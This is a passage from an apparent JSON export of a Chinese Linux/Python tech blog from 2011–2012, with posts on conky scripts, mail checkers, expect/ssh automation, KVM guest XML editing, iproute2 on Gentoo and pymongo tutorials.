http://xml.weather.com/weather/local/&lt;LOCATION&gt;?cc=*&amp;dayf=10&amp;link=xoap&amp;prod=xoap&amp;par=&lt;XOAP_PARTNER_ID&gt;&amp;key=&lt;XOAP_LICENCE_KEY&gt;&amp;unit=m\nMAXIMUM_DAYS_FORECAST = 4</p>\n\n<p>#===============================================#\n# USER SETTINGS, EDIT BASED ON DOCUMENTED SETUP #\n#===============================================#\nCACHE_FOLDERPATH = /tmp/\nCONNECTION_TIMEOUT = 5\nEXPIRY_MINUTES = 30\nTIME_FORMAT = %H:%M\nDATE_FORMAT = %Y-%m-%d\nLOCALE = en\nXOAP_PARTNER_ID =\nXOAP_LICENCE_KEY =\nDEFAULT_LOCATION = UKXX0103\nAUTO_NIGHT = False\nPROXY_HOST =\nPROXY_PORT = 8080\nPROXY_USERNAME =\nPROXY_PASSWORD =\n</pre>\n<strong>4 相关的脚本文件</strong>\n<strong>1 ~/conky/conkyHD1.py 检查硬件信息</strong>\n<pre class=\"sh_python\">\n#!/usr/bin/env python\nimport sys\nimport os\nimport subprocess</p>\n\n<p># root filesystem\nprint (\"${voffset -2}${color0}${font Poky:size=15}y${font}${color}${offset 6}${voffset -7}Root: ${font Ubuntu:style=Bold:size=8}${color1}${fs_free_perc /}%${color}${font}\\n\")\nprint (\"${voffset -12}${color0}${fs_bar 4,20 /}${color}${offset 8}${voffset -2}F: ${font Ubuntu:style=Bold:size=8}${color2}${fs_free /}${color}${font} U: ${font Ubuntu:style=Bold:size=8}${color2}${fs_used /}${color}${font}\\n\")</p>\n\n<p># /home folder (if its a separate mount point)\nif os.path.ismount(\"/home\"):\n\tprint (\"${voffset -12}${color0}${font Poky:size=15}y${font}${color}${offset 6}${voffset -7}Home: ${font Ubuntu:style=Bold:size=8}${color1}${fs_free_perc /home}%${color}${font}\\n\")\n\tprint (\"${voffset -12}${color0}${fs_bar 4,20 /home}${color}${offset 8}${voffset -2}F: ${font Ubuntu:style=Bold:size=8}${color2}${fs_free /home}${color}${font} U: ${font Ubuntu:style=Bold:size=8}${color2}${fs_used /home}${color}${font}\\n\")</p>\n\n<p># folder in /media\nfor device in os.listdir(\"/media/\"):\n\tif (not device.startswith(\"cdrom\")) and (os.path.ismount('/media/'+device)):\n\t\tprint (\"${voffset -12}${color0}${font Poky:size=15}y${font}${color}${offset 6}${voffset -7}\"+device.capitalize()+\": ${font Ubuntu:style=Bold:size=8}${color1}${fs_free_perc /media/\"+device+\"}%${color}${font}\\n\")\n\t\tprint (\"${voffset -12}${color0}${fs_bar 4,20 /media/\"+device+\"}${color}${offset 8}${voffset -2}F: ${font Ubuntu:style=Bold:size=8}${color2}${fs_free /media/\"+device+\"}${color}${font} U: ${font Ubuntu:style=Bold:size=8}${color2}${fs_used /media/\"+device+\"}${color}${font}\\n\")\nprint (\"${voffset -12}\")\n</pre>\n<strong>2 ~/conky/onkyIp.sh 网络相关，流量 IP 信息</strong>\n<pre class=\"sh_bash\">\n#!/bin/bash\nwget http://checkip.dyndns.org/ -q -O - |\ngrep -Eo '\\&lt;[[:digit:]]{1,3}(\\.[[:digit:]]{1,3}){3}\\&gt;'\n</pre>\n<strong>3 检查我公司邮箱的邮件 因为是POP3的 无法抓取未读邮件的标记 写本地文件对比是不是有新邮件，显示最近的三条邮件的主题。参数是 mail服务器 用户 密码</strong>\n<pre class=\"sh_python\">\nimport sys\nimport poplib  \nimport time\nimport email.Header\nmailserver = sys.argv[1]\nuser = sys.argv[2]\npasswd = sys.argv[3]</p>\n\n<p>emailServer = poplib.POP3(mailserver)  \nemailServer.user(user)  \nemailServer.pass_(passwd)  </p>\n\n<p>emailMsgNum, emailSize = emailServer.stat()  \ntime.sleep(3)\ntry:\n    f = open('text','r')\n    data = f.read()\n    f.close()\nexcept:\n    data ='0'\nif int(emailMsgNum) &gt; int(data):\n    f = open('text','w')\n    f.write(str(emailMsgNum))\n    f.close()\n    print 'You have %d new mail(s)' % (int(emailMsgNum)-int(data))\nelse:\n    f = open('text','w')\n    f.write(str(emailMsgNum))\n    f.close()\n    print 'You have 0 new mail(s)'\nfor i in range(emailMsgNum)[::-1][0:3]:  \n    for piece in emailServer.retr(i+1)[1]:  \n        if piece.startswith('Subject'):  \n            try:\n               code = email.Header.decode_header(piece)[1][1]\n               print '%s' % (u'\\u4e3b\\u9898\\uff1a' + email.Header.decode_header(piece)[1][0].decode(code)).encode('utf-8')\n            except:\n               code =  email.Header.decode_header(piece)[0][1]\n               if code == None:\n                   code = 'utf-8'\n               print '%s' % (u'\\u4e3b\\u9898\\uff1a' + email.Header.decode_header(piece)[0][0].decode(code)).encode('utf-8')\nemailServer.quit()\n</pre>\n 5<strong>检查GMAIL邮件 这里是imap，显示最近的三条邮件的主题。参数是 mail服务器 用户 密码 \n</strong><pre class=\"sh_python\">\nimport sys\nimport imaplib\nimport time\nimport email.Header\nimport traceback\nimport re</p>\n\n<p>mailserver = sys.argv[1]\nuser = sys.argv[2]\npasswd = sys.argv[3]\nemailServer=imaplib.IMAP4_SSL(mailserver)\ntry:\n    emailServer.login(user,passwd)\n    emailServer.select()\n    x,y=emailServer.status('INBOX','(MESSAGES UNSEEN)')\n    emailMsgNum=int(re.search('MESSAGES\\s+(\\d+)',y[0]).group(1))\n    unseen=int(re.search('UNSEEN\\s+(\\d+)',y[0]).group(1))\nexcept:\n    print 'connect error'</p>\n\n<p>time.sleep(3)\ntry:\n    f = open('imaptext','r')\n    data = f.read()\n    f.close()\nexcept:\n    data ='0'\nif int(emailMsgNum) &gt; int(data):\n    f = open('imaptext','w')\n    f.write(str(emailMsgNum))\n    f.close()\n    print 'You have %d new mail(s)  unseen %s mail(s)' % (int(emailMsgNum)-int(data),unseen)\nelse:\n    f = open('imaptext','w')\n    f.write(str(emailMsgNum))\n    f.close()\n    print 'You have 0 new mail(s)'\nfor num in range(emailMsgNum)[::-1][0:3]:\n        type, msg_data = emailServer.fetch(num, '(RFC822)')\n        for response_part in msg_data:\n            if isinstance(response_part, tuple):\n                msg = email.message_from_string(response_part[1])\n                subject=msg['subject']\n                try:\n                   code = email.Header.decode_header(subject)[1][1]\n                   print '%s' % (u'\\u4e3b\\u9898\\uff1a' + email.Header.decode_header(subject)[1][0].decode(code)).encode('utf-8')\n                except:\n                   code =  email.Header.decode_header(subject)[0][1]\n                   if code == None:\n                       code = 'utf-8'\n                   print '%s' % (u'\\u4e3b\\u9898\\uff1a' + email.Header.decode_header(subject)[0][0].decode(code)).encode('utf-8')</p>\n\n<p>emailServer.logout()\n</pre>\n<strong>6 开机启动</strong>\n因为需要等待以下再启动程序 要不然桌面还没有启动好 conky就启动了\nstartconky\n<pre class=\"sh_bash\">\n#!/bin/bash\nsleep 10 &amp;&amp; conky -c ~/conky/conkyrc\n</pre>\nchmod +x startconky\n系统 首选项  启动应用程序 添加</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "29"
    }
  },
  {
    "id": 116,
    "title": "UnicodeEncodeError: 'latin-1' codec can't encode characters in position 报错解决",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/unicodeencodeerror-latin-1-codec-cant-encode-characters-in-position-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/",
    "content": "<p>前言：使用mysqldb查询数据库有一个报错：</p>\n\n<p>Traceback (most recent call last):\nFile \"/home/dongwm/RevSocket.py\", line 52, in &lt;module&gt;\nmain.run()\nFile \"/home/dongwm/RevSocket.py\", line 47, in run\nprint base.decode(buf,'sde#*df'')\nUnicodeEncodeError: 'latin-1' codec can't encode characters in position 96-119: ordinal not in range(256)</p>\n\n<p>后来群里面也有人遇见这样的问题，我正好仔细研究了一下 是本地locale变量的问题：</p>\n\n<p>export LANG=en_US.UTF-8\n执行上述语句即可</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "30"
    }
  },
  {
    "id": 117,
    "title": "关于expect研究（三）",
    "category": "expect",
    "tags": [

    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Eexpect%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%89%EF%BC%89/",
    "content": "<p>前言：本文主要介绍expect的正则表达式和参数匹配的一个例子</p>\n\n<p>需求： ssh常用的端口是22 但是有些端口可能不是，所以设计了一个如果有参数就表示端口指定了其它 没有参数表示使用默认的22。我本机设置了一些hosts，假如以‘mta’开头的就匹配第二条</p>\n\n<p><pre class=\"sh_tcl\">\n#!/usr/bin/expect\nset timeout 10\nset file1 [lindex $argv 0]\nset port [lindex $argv 1]\nif {$port==\"\"} {\nset port 22\n}\nif {$argc&gt;2} {\nputs stderr \"参数错误,请使用以下格式: $argv0 {想去的服务器简称,比如89} \"\nexit 1\n}\nif {$file1==\"26\"} {\nspawn sshfs -p 62100 root@10.14.22.26:/home/dongwm 26\nexpect \"password:\"\nsend \"$password1089\\n\"\ninteract\n} elseif {[regexp {^mta} $file1 found]} {\nspawn sshfs -p 61012 root@$file1:/home/dongwm $file1\ninteract\n} else {\nspawn luit -encoding gbk ssh -p $port root@$file1\ninteract\n}\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "03"
    }
  },
  {
    "id": 118,
    "title": "使用xml.etree.ElementTree修改/删除kvm项目的guest机器xml文件",
    "category": "kvm",
    "tags": [
      "kvm",
      "kvm guest",
      "libvirt",
      "python 修改xml",
      "xml.etree.ElementTree"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8xml-etree-elementtree%E4%BF%AE%E6%94%B9%E5%88%A0%E9%99%A4kvm%E9%A1%B9%E7%9B%AE%E7%9A%84guest%E6%9C%BA%E5%99%A8xml%E6%96%87%E4%BB%B6/",
    "content": "<p>前言：修改xml文件也可以用xml.dom. minidom,但是相对没有etree的简洁方便，以下是一个例子：</p>\n\n<p><pre class=\"sh_python\">\nimport libvirt\nfrom subprocess import *\nimport os,string\nimport xml.etree.ElementTree as ET   \nclass modify:\n    def __init__(self):\n        try:\n            self.conn=libvirt.open(None)\n\texcept libvirt.libvirtError:\n\t    return -1\n    def dump(self,name):\n        call('virsh dumpxml %(name)s &gt; /tmp/%(name)s.xml' % {'name':name},shell = True)   #将xml文件导出\n        self.tree = ET.parse(\"/tmp/%s.xml\" % name)   #解析xml文件\n        self.root = self.tree.getroot()  #得到root树\n    def deldisk(self,dict):\n        x = dict['num']\n        name = dict['name'] \n        self.dump(name)\n        hd = 'hd%s' % string.lowercase.replace('c','')[x-1]  \n        for i in self.root.find('devices').findall('disk'):\n            if i.find('target').get('dev') == hd:       #找到要删除的那个硬盘那标识\n                del self.root.find('devices')[self.root.find('devices').getchildren().index(i)]\n        self.done(name) \n    def moddisk(self,dict): \n        name = dict[\"name\"]\n        self.dump(name)\n        for key in dict.keys():\n            if key == 'mem':\n                num =  int(1024)*int(dict['mem'])               #修改内存\n                self.root.find('memory').text = '%s' % num \n            if key == 'cpu':\n                self.root.find('vcpu').text = '%s' % dict['cpu']    #修改cpu个数\n        self.done(name)\n     def adddisk(self,dict):\n        name = dict['name']\n        img_path = dict['img_path']\n        size = dict['size']\n        cmd=\"qemu-img create -f raw %s %dG\" %(img_path,size)  #创建guest的img文件\n        try:\n           os.system(cmd)\n        except IOError,e:\n           return -1\n        self.dump(name)\n        dev = self.root.find('devices')\n        x = 0\n        for i in dev:\n            if i.tag == \"disk\":\n                x +=1\n        hd = 'hd%s' % string.lowercase.replace('c','')[x-1]  #这里主要是为了判断已经有几个disk，然后根据顺序选择hdX 除去‘c’是因为cdrom占用了\n        disk = ET.Element('disk')\n        disk.set('type', 'file')\n        disk.set('device', 'disk')\n        source = ET.SubElement(disk,'source')\n        source.set('file',img_path)\n        target = ET.SubElement(disk,'target')\n        target.set('dev',hd)\n        target.set('bus','ide')\n        dev.insert(x,disk)   #添加一个disk树 \n        self.done(name)\n     def done(self,name):\n        self.tree.write('/tmp/%s.xml' % name)     #将最新修改写到xml文件\n        dom=self.conn.lookupByName(name)   \n        try: \n            dom.destroy()      #关机guest\n        except:\n            pass\n        dom.undefine()   \n        fxml=open('/tmp/%s.xml' % name, 'r')\n        flist=fxml.readlines()\n        if (len(flist) ):\n            xmldesc=\"\".join(flist)\n        else:\n            return -1\n        fxml.close()  \n        try:\n            dom=self.conn.defineXML(xmldesc)  #重新定义这个guest 加载最新配置\n        except:\n            traceback.print_exc()      \n        call('virsh start %s' % name,shell = True)  #启动guest\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "06"
    }
  },
  {
    "id": 119,
    "title": "gentoo笔记（六）iproute2和telnet",
    "category": "gentoo",
    "tags": [
      "ifstat",
      "iproute2",
      "lnstat",
      "netkit-telnetd",
      "nstat",
      "rtmon"
    ],
    "url": "/archives/gentoo%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89iproute2%E5%92%8Ctelnet/",
    "content": "<p><strong>前言：习惯其他的linux用户的困惑：telnet 呢 route呢？</strong></p>\n\n<p><strong>gentoo的telnet：</strong></p>\n\n<p>sudo emerge net-misc/netkit-telnetd\n<strong>gentoo的route：</strong>\nsudo emerge sys-apps/iproute2</p>\n\n<p><strong>其中的有用的工具： 1 ifstat 网络接口监测工具</strong>\ndongwm@localhost ~ $/sbin/ifstat -a\n#kernel\nInterface        RX Pkts/Rate    TX Pkts/Rate    RX Data/Rate    TX Data/Rate\nRX Errs/Drop    TX Errs/Drop    RX Over/Rate    TX Coll/Rate\nlo                   420 0           420 0         19240 0         19240 0\n0 0             0 0             0 0             0 0\neth1              104098 0         56629 0       107743K 0         5085K 0\n0 890           0 0             0 0             0 0\n<strong>2ip</strong></p>\n\n<p>主可执行程序，它包含以下几个功能：</p>\n\n<p>ip link <em><tt>[device]</tt></em> 查看和修改设备状态</p>\n\n<p>ip addr 查看地址的特性，添加新地址、删除旧地址。</p>\n\n<p>ip neighbor 查看邻居的特性，添加新邻居、删除旧邻居。</p>\n\n<p>ip rule 查看和修改路由规则</p>\n\n<p>ip route 查看路由表和修改路由表规则  也就是其它linux系统的route</p>\n\n<p>ip tunnel 查看和修改 IP 隧道及其特性</p>\n\n<p>ip maddr 查看和修改多播地址及其特性</p>\n\n<p>ip mroute 设置、修改、删除多播路由</p>\n\n<p>ip monitor 不间断的监视设备状态、地址、路由</p>\n\n<p><strong>3 ss类似于 netstat 命令，显示活动的连接。</strong></p>\n\n<p><strong>4 lnstat 提供 Linux 网络统计信息，用于替代旧的 rtstat 程序</strong></p>\n\n<p><strong>5 nstat 显示网络统计信息</strong></p>\n\n<p><strong>6 rtmon路由监视工具</strong></p>\n\n<p>rtmon file /var/log/rtmon.log\nip monitor file /var/log/rtmon.log\n<strong>7  tc 流量控制，用于实现服务质量(QOS)和服务级别(COS)</strong></p>\n\n<p>tc qdisc 建立排队规则</p>\n\n<p>tc class 建立基于级别的队列调度</p>\n\n<p>tc estimator 估算网络流量</p>\n\n<p>tc filter 设置 QOS/COS 包过滤器</p>\n\n<p>tc policy 设置 QOS/COS 规则</p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "14"
    }
  },
  {
    "id": 120,
    "title": "kvm创建guest img文件的一个小问题",
    "category": "kvm",
    "tags": [
      "statvfs"
    ],
    "url": "/archives/kvm%E5%88%9B%E5%BB%BAguest-img%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/",
    "content": "<p>前言：这是作kvm项目的一个小发现：当我使用命令创建i㎎文件‘qemu-img create -f raw  i㎎路径具体位置 文件大小’，但是当查看文件的具体占用空间发现：</p>\n\n<p>[root@localhost ~]# qemu-img create -f raw  /data1//1.img 10G\nFormatting '/data1/domains/1.img', fmt=raw, size=10485760 kB\n使用python模块statvfs+os查看分区大小没有改变，然后使用‘df －h’发现新建guest后剩余容量未变</p>\n\n<p>[root@localhost ~]# du -sh /data1/1.img\n0    /data1/domains/1.img   ＃这里是0  相当于没有占用的磁盘空间</p>\n\n<p>但是\n[root@localhost ~]# ls -lh !$\nls -lh /data1/domains/1.img\n-rw-r--r-- 1 root root 10G Jan 14 15:23 /data1/1.img</p>\n\n<p>虽然img文件随着数据增加而占用越来越多，直到创建值。但是我们在统计剩余磁盘空间的时候需要把这些量预留出来。但是既然系统命令无法得到需要的值，那么自己取：</p>\n\n<p><pre class=\"sh_python\"></p>\n\n<p>from  statvfs import F_BLOCKS,F_BAVAIL,F_BSIZE\nimport os\nclass Capture：\n    def main(self):\n        try:\n            fp=open('/proc/mounts','r')\n        except:\n            print 'open /proc/mounts error'\n            return\n        mounts=[i.strip() for i in fp.readlines()]\n        for i in mounts:\n             tmpList=i.split(' ')\n             if tmpList[0]=='/dev/root':\n                 continue  \n             if os.path.exists(tmpList[0]) and not os.path.isdir(tmpList[0]):\n                 total_size,avail_size=self.getSize(tmpList[1])\n    def du(self,data):\n             d = os.popen('du -sh %s' % data)\n             return d.readline().split('\\t')[0]\n    def lslh(self,data):\n             d = os.popen('ls -lh %s' % data)\n             return int(re.compile(r'\\S+').findall(d.readline())[4][:-1])\n    def getSize(self,dir):\n             vfs=os.statvfs(dir)\n             total_disk=vfs[F_BLOCKS]*vfs[F_BSIZE]/1024/1024/1024\n             free_disk=vfs[F_BAVAIL]*vfs[F_BSIZE]/1024/1024/1024\n             num = 0\n             for parent, dirnames, filenames in os.walk(dir):\n                 for i in filenames:\n                     if re.compile(r'.*\\.img$').match(i) and not re.compile(r'root.img$').match(i):\n                         path = '%s/%s' % (parent,i)\n                         if self.du(path) == '0':\n                             num+= self.lslh(path)\n             free_disk -=num\n             return total_disk,free_disk\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "14"
    }
  },
  {
    "id": 121,
    "title": "关于kvm使用virt-manager报错",
    "category": "kvm",
    "tags": [
      "virt-manager"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ekvm%E4%BD%BF%E7%94%A8virt-manager%E6%8A%A5%E9%94%99/",
    "content": "<p>前言：使用linux桌面连接远程kvm服务器，使用virt-manager，出现下面报错：</p>\n\n<p>Traceback (most recent call last):\nFile \"/usr/share/virt-manager/virt-manager.py\", line 376, in ?\n_show_startup_error(str(run_e), \"\".join(traceback.format_exc()))\nFile \"/usr/share/virt-manager/virt-manager.py\", line 52, in _show_startup_error\nimport gtk\nFile \"/usr/lib64/python2.4/site-packages/gtk-2.0/gtk/__init__.py\", line 76, in ?\n_init()\nFile \"/usr/lib64/python2.4/site-packages/gtk-2.0/gtk/__init__.py\", line 64, in _init\n_gtk.init_check()\nRuntimeError: could not open display</p>\n\n<p>解决办法（原因是ssh登录参数，传输X窗口相关参数，C应该是压缩）：</p>\n\n<p>luit -encoding gbk ssh -p端口 root@kvm服务器IP -X -C</p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "16"
    }
  },
  {
    "id": 122,
    "title": "使用python程序移除文件中的“^M”(windows换行符)",
    "category": "linux基础",
    "tags": [
      "windows换行符"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8python%E7%A8%8B%E5%BA%8F%E7%A7%BB%E9%99%A4mwindows%E6%8D%A2%E8%A1%8C%E7%AC%A6/",
    "content": "<p>前言：<span><em>windows换行符</em>的文本在unix下编辑时显示^M，有时候编辑起来很不爽，使用这个程序可以去除windows换行符</span></p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport sys\nimport tempfile</p>\n\n<p>def main():\n    filename = sys.argv[1]\n    with tempfile.NamedTemporaryFile(delete=False) as fh:\n        for line in open(filename):\n            line = line.rstrip()\n            fh.write(line + '\\n')\n        os.rename(filename, filename + '.bak')\n        os.rename(fh.name, filename)</p>\n\n<p>if __name__ == '__main__':\n    main()\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "January",
      "day": "31"
    }
  },
  {
    "id": 123,
    "title": "gentoo笔记（七）安装google-chrome",
    "category": "gentoo",
    "tags": [
      "chrome",
      "google-chrome"
    ],
    "url": "/archives/gentoo%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%83%EF%BC%89%E5%AE%89%E8%A3%85google-chrome/",
    "content": "<p>1 /etc/portage/package.keywords</p>\n\n<p>添加一行：www-client/google-chrome</p>\n\n<p>2 /etc/make.conf</p>\n\n<p>添加一行：ACCEPT_LICENSE=\"google-chrome\"</p>\n\n<p>3 安装</p>\n\n<p>dongwm@localhost ~ $sudo emerge www-client/google-chrome</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "01"
    }
  },
  {
    "id": 124,
    "title": "pymongo教程（一）",
    "category": "mongodb",
    "tags": [
      "pymongo"
    ],
    "url": "/archives/pymongo%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/",
    "content": "<p>前言：本文是一些简单的使用python模块的例子，主旨是帮助使用本模块的朋友找到使用方法</p>\n\n<p>1 一个MongoDB的文档</p>\n\n<p>本质上是附带了一些额外功能一个JSON文件</p>\n\n<p><pre class=\"sh_python\">\nfrom datetime import datetime\nuser_doc = {\n    \"username\" : \"weiming\",\n    \"firstname\" : \"dong\",\n    \"surname\" : \"Chris\",\n    \"dateofbirth\" : datetime(1985, 4, 18),\n    \"email\" : \"ciici1234@.hotmail.com\",\n    \"score\" : 0\n}\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>2   使用python连接mongodb</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>from pymongo import Connection\nfrom pymongo.errors import ConnectionFailure</p>\n\n<p>def main():\n    \"\"\" Connect to MongoDB \"\"\"\n    try:\n        c = Connection(host=\"localhost\", port=27017)  #端口可能不同，看你的配置文件\n        print \"Connected successfully\"\n    except ConnectionFailure, e:\n        sys.stderr.write(\"Could not connect to MongoDB: %s\" % e)\n        sys.exit(1)</p>\n\n<p>if __name__ == \"__main__\":\n    main()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>3 插入数据（文档）到集合</p>\n\n<p><pre class=\"sh_python\">\nimport sys\nfrom datetime import datetime\nfrom pymongo import Connection\nfrom pymongo.errors import ConnectionFailure</p>\n\n<p>def main():\n    try:\n        c = Connection(host=\"localhost\", port=27017)\n    except ConnectionFailure, e:\n        sys.stderr.write(\"Could not connect to MongoDB: %s\" % e)\n        sys.exit(1)\n    dbh = c[\"mydb\"]\n    assert dbh.connection == c\n    user_doc = {\n        \"username\" : \"weiming\",\n        \"firstname\" : \"dong\",\n        \"surname\" : \"Chris\",\n        \"dateofbirth\" : datetime(1985, 4, 18),\n        \"email\" : \"ciici1234@hotmail.com\",\n        \"score\" : 0\n    }</p>\n\n<p>    dbh.users.insert(user_doc, safe=True)   #可确保写成功，或将抛出一个异常\n    print \"Successfully inserted document: %s\" % user_doc</p>\n\n<p>if __name__ == \"__main__\":\n    main()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>4 保障写入到多个数据库节点</p>\n\n<p>dbh.users.insert(user_doc, w=2)    #它被写入到至少有一个 replica set的2个服务器才算成功</p>\n\n<p>5 MongoDB的查询语言简介</p>\n\n<p>如果我们想检索firstname是“dong”</p>\n\n<p>q = {\n\"firstname\" : \"jane\"\n}\n如果我们想检索firstname是“dong” 和username是 \"weiming\"</p>\n\n<p>q = {\n \"username\" : \"weiming\",\n \"firstname\" : \"dong\",}\n}\n如果我们想检索score大于0\nq = {\n\"score\" : { \"$gt\" : 0 }\n}\n5 查找单个文档;\nuser_doc = dbh.users.find_one({\"username\" : \"weiming\"})\nif not user_doc:\n    print \"no document found for username janedoe\"\n6 查找多个文档：\nusers = dbh.users.find({\"firstname\":\"dong\"})\nfor user in users:\n    print user.get(\"email\")\n7 检索单个字段：\nusers = dbh.users.find({\"firstname\":\"dong\"}, {\"email\":1})  #只检索邮件字段 但是也包含_id\nfor user in users:\n    print user.get(\"email\")\n8 查看有多少文件在用户的集合\nuserscount = dbh.users.find().count()\nprint \"There are %d documents in users collection\" % userscount\n9 排序（查找firstname是“dong”的文档，然后根据生日排序）\nusers = dbh.users.find(\n    {\"firstname\":\"dong\"}).sort((\"dateofbirth\", pymongo.DESCENDING))\nfor user in users:\n    print user.get(\"email\"）\n也可以这样：\nusers = dbh.users.find({\"firstname\":\"dong\"},\n    sort=[(\"dateofbirth\", pymongo.DESCENDING)])\nfor user in users:\n    print user.get(\"email\") \n10 排序+限制（如果符合的文档太多，假如我想取分数前十）： \nusers = dbh.users.find().sort((\"score\", pymongo.DESCENDING)).limit(10)\nfor user in users:\n    print user.get(\"username\"), user.get(\"score\", 0)\n11 可用于翻页，就是排序后跳过一定数量的结果\nusers = dbh.users.find().sort(\n    (\"surname\", pymongo.ASCENDING)).limit(20).skip(20)\n12 我的理解是，当数据库很繁忙，为了防止重复查询一个可能会修改的结果，遍历整个用户集合，使用快照方式\nfor user in dbh.users.find(snapshot=True):\n    print user.get(\"username\"), user.get(\"score\", 0)\n13 更新修改集合数据\ndbh.users.update({\"username\":\"janedoe\"},\n    {\"$set\":{\"email\":\"admin@dongwm.com\"}}, safe=True)\ndbh.users.update({\"username\":\"dong\"},\n    {\"$set\":{\"email\":\"admin@dongwm.com\", \"score\":1}}, safe=True)  #更新多个条件\ndbh.users.update({\"score\":0},{\"$set\":{\"flagged\":True}}, multi=True, safe=True)  #所有符合条件\"score\":0的文档将被更新\n14 删除用户集合中的文档\ndbh.users.remove({\"score\":1}, safe=True)    #删除用户集合中的符合\"score\":1文档\ndbh.users.remove(None, safe=True) #删除用户集合中的所有文档</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "01"
    }
  },
  {
    "id": 125,
    "title": "gentoo笔记（八）安装亦歌在线听歌软件（1g1g）",
    "category": "gentoo",
    "tags": [
      "1g1g",
      "亦歌"
    ],
    "url": "/archives/gentoo%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AB%EF%BC%89%E5%AE%89%E8%A3%85%E4%BA%A6%E6%AD%8C%E5%9C%A8%E7%BA%BF%E5%90%AC%E6%AD%8C%E8%BD%AF%E4%BB%B6%EF%BC%881g1g%EF%BC%89/",
    "content": "<p>以下是简要过程</p>\n\n<p>tar jxvf linux1g1g-0.9-2-src.tar.bz2\ncd linux1g1g\nsudo emerge xbindkeys\nqmake -o Makefile\nmake\n./bindkeys.sh</p>\n\n<p>sudo cp linux1g1g /usr/bin/\n然后执行：</p>\n\n<p>dongwm@localhost ~ $linux1g1g\n就能打开了</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "02"
    }
  },
  {
    "id": 126,
    "title": "pymongo教程（三）",
    "category": "mongodb",
    "tags": [

    ],
    "url": "/archives/pymongo%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89/",
    "content": "<p>1 MongoDB 队列查询\n$gt 大于 例子：“score”:{\"$gt”:0}\n$lt小于 例子：“score”:{\"$lt”:0}\n$gte 大于等于例子： “score”:{\"$gte”:0}\n$lte 小于等于 例子：“score”:{\"$lte”:0} ⇐\n$all all  例子：“skills”:{\"$all”:[\"mongodb”,\"python\"]}\n$exists 属性必须存在 例子：“email”:{\"$exists”:True}\n$mod 模块X等于Y 例子： “seconds”:{\"$mod”:[60,0]}\n$ne 不等于 例子：“seconds”:{\"$ne”:60}\n$in In 例子： “skills”:{\"$in”:[\"c”,\"c++\"]}\n$nin Not In 例子：“skills”:{\"$nin”:[\"php”,\"ruby”,\"perl\"]}\n$nor Nor例子： “$nor”:[{\"language”:\"english\"},{\"coun- N/A\ntry”:\"usa\"}]\n$or Or 例子：“$or”:[{\"language”:\"english\"},{\"coun- OR\ntry”:\"usa\"}]\n$size 数组个数 例子： “skills”:{\"$size”:3}</p>\n\n<p>2 MongoDB更新修改</p>\n\n<p>$inc 子增长 “$inc”:{\"score”:1}\n$set 设置属性值 “$set”:{\"username”:\"niall\"}\n$unset 取消（删除）属性值 “$unset”:{\"username”:1}\n$push 增加  “$push”:{\"emails”:\"foo@example.com\"}\n$pushAll 增加多个 “$pushall”:{\"emails”:[\"foo@example.com”,\"foo2@ex-\nample.com\"]}\n$addToSet 不存在增加 “$addToSet”:{\"emails”:\"foo@example.com\"}\n$pop 数组尾部去除 “$pop”:{\"emails”:1}\n$pull  数组删除项 “$pull”:{\"emails”:\"foo@example.com\"}\n$pullAll 删除数组all项 “$pullAll”:{\"emails”:[\"foo@example.com”, “foo2@ex-\nmoval ample.com\"]}\n$rename 属性重命名 “$rename”:{\"emails”:\"old_emails\"}</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "06"
    }
  },
  {
    "id": 127,
    "title": "pymongo教程（二）",
    "category": "mongodb",
    "tags": [
      "pymongo"
    ],
    "url": "/archives/pymongo%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89/",
    "content": "<p>1  移除子文档：</p>\n\n<p>user_doc = {\n\"username\":\"foouser\",\n\"emails\":[\n{\n\"email\":\"foouser1@dongwm.com\",\n\"primary\":True\n},\n{\n\"email\":\"foouser2@dongwm.com\",\n\"primary\":False\n},\n{\n\"email\":\"foouser3@dongwm.com\",\n\"primary\":False\n}\n]\n}\ndbh.users.insert(user_doc, safe=True)\ndbh.users.update({\"username\":\"foouser\"},\n{\"$pull\":{\"emails\":{\"email\":\"foouser2@dongwm.com\"}}}, safe=True)   #移除 \"foouser2@dongwm.com\"子文档</p>\n\n<p>2 增加子文档</p>\n\n<p>new_email = {\"email\":\"fooemail4@dongwm.com\", \"primary\":False}\ndbh.users.update({\"username\":\"foouser\"},\n{\"$push\":{\"emails\":new_email}}, safe=True)   #使用$push增加</p>\n\n<p>3 修改子文档</p>\n\n<p>user_doc = 